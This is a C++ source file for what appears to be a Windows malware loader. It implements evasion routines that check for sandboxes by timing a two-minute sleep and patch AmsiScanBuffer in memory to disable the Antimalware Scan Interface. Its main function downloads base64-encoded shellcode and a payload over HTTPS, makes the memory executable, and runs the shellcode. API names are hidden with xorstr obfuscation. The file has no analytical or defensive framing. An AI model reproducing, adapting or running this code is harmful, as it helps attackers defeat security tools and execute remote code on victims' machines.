#include "CFuck.h"

CFuck* CFuck::m_Instance = nullptr;

CFuck* CFuck::GetInstance()
{
	if (!m_Instance)
		m_Instance = new CFuck();
	return m_Instance;
}

bool NtdllFileExist()
{
	// 获取系统目录
	char path[MAX_PATH] = { 0 };
	GetWindowsDirectoryA(path, sizeof(path));
	strcat_s(path, sizeof(path), xorstr_("\\System32\\ntdll.dll"));
	if (PathFileExistsA(path))
	{
		return true;
	}
	return false;
}


// If a sandbox is running, the "Sleep" will be accelerated
int get_current_time()
{
	time_t rawtime;
	struct tm  timeinfo;
	time(&rawtime);
	localtime_s(&timeinfo, &rawtime);
	return timeinfo.tm_min;
}

bool check_sleep_acceleration()
{
	int first_time, second_time;

	first_time = get_current_time();
	Sleep(120000); // Sleeps 2 minutes

	second_time = get_current_time();

	if ((second_time - first_time) >= 2)
	{
		return true;
	}

	return false;
}

bool PatchAMSI()
{
	// mov eax,0x80070057;  ret 0x18;   参数错误:HRESULT:0X80070057(E_INVALIDARG)
	unsigned char patchx86[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

	do
	{
		HMODULE hAMSI = LoadLibraryA(xorstr_("amsi.dll"));
		if (!hAMSI)
			break;

		PVOID address = GetProcAddress(hAMSI, xorstr_("AmsiScanBuffer"));
		if (!address)
			break;

		HMODULE hKernel32 = GetModuleHandleA(xorstr_("kernel32.dll"));
		if (!hKernel32)
			break;

		typedef BOOL(WINAPI*typfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
		typfnVirtualProtect pfnVirtualProtect = (typfnVirtualProtect)GetProcAddress(hKernel32, xorstr_("VirtualProtect"));
		if (!pfnVirtualProtect)
			break;

		DWORD old;
		pfnVirtualProtect(address, sizeof(patchx86), PAGE_EXECUTE_READWRITE, &old);
		memcpy_s(address, sizeof(patchx86), patchx86, sizeof(patchx86));

		return true;

	} while (false);

	return false;
}

BOOL CFuck::BypassAV()
{
	bool bRet = false;

	// 存在ntdll文件
	bRet = NtdllFileExist();

	// 休眠时间没有被加速
	bRet = check_sleep_acceleration();

	// Antimalware Scan Interface
	PatchAMSI();

	return bRet;
}

CFuck::CFuck()
{
}


CFuck::~CFuck()
{
}

//
// https get shellcode
// https get payload
// pShellcode(payload,size);
//
BOOL CFuck::FuckLoad(IN LPWSTR pCodeUrl, IN LPWSTR pDataUrl1, IN LPWSTR pDataUrl2)
{
	char* pAddress = nullptr;

	do
	{
		std::string pCodeBase64 = GetHtmlStringUseHttps(pCodeUrl);
		std::string pDataBase641 = GetHtmlStringUseHttps(pDataUrl1);
		std::string pDataBase642 = GetHtmlStringUseHttps(pDataUrl2);
		std::string pDataBase64 = pDataBase641 + pDataBase642;
		if (pCodeBase64.empty() || pDataBase64.empty())
			break;

		std::string pCode = Base64Decode(pCodeBase64);
		std::string pData = Base64Decode(pDataBase64);

		pAddress = (char*)malloc(pCode.size());
		if (!pAddress)
			break;
		memcpy_s(pAddress, pCode.size(), pCode.c_str(), pCode.size());

		HMODULE hKernel32 = GetModuleHandleA(xorstr_("kernel32.dll"));
		if (!hKernel32)
			break;

		typedef BOOL(WINAPI*typfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
		typfnVirtualProtect pfnVirtualProtect = (typfnVirtualProtect)GetProcAddress(hKernel32, xorstr_("VirtualProtect"));
		if (!pfnVirtualProtect)
			break;

		DWORD old;
		pfnVirtualProtect(pAddress, pCode.size(), PAGE_EXECUTE_READWRITE, &old);

		ExeCSharp pfn = (ExeCSharp)pAddress;
		pfn((char*)pData.c_str(), pData.size());

		return TRUE;

	} while (false);

	if (pAddress)
		free(pAddress);

	return FALSE;
}

std::string CFuck::GetHtmlStringUseHttps(IN LPWSTR pUrl)
{
	CWinHttp pHttp;

	std::string result = pHttp.Request(pUrl, Get);

	return result;
}


std::string CFuck::Base64Decode(std::string const& str)
{
	std::string ret;
	DWORD need = 0;
	LPBYTE buffer = nullptr;

	CryptStringToBinaryA(str.c_str(), 0, CRYPT_STRING_BASE64, NULL, &need, NULL, NULL);
	if (need)
	{
		buffer = (LPBYTE)malloc(need);
		CryptStringToBinaryA(str.c_str(), 0, CRYPT_STRING_BASE64, buffer, &need, NULL, NULL);
	}

	ret.append((char*)buffer, need);
	if (buffer)
		free(buffer);

	return ret;
}